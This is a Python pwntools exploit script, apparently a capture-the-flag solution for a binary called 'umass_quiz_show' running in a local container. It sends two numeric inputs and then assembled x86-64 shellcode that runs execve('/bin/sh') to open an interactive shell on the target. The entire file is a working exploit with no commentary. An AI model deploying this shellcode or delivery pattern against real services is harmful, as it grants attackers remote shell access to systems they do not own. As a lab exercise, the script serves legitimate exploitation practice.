from pwn import *


p = remote("172.17.0.2", 6432);
context.binary = 'static/umass_quiz_show'

if args.GDB:
    gdb.attach(p, gdbscript=f'''
        b main
    ''')

payload = asm("""
    xor rsi, rsi
    xor rdx, rdx
    push rsi
    mov rbx, 0x68732f6e69622f2f
    push rbx
    push rsp
    pop rdi
    mov rax, 59
    syscall
""");

p.sendline(b"26");
p.sendline(b"1863");
p.sendline(payload);

p.interactive()
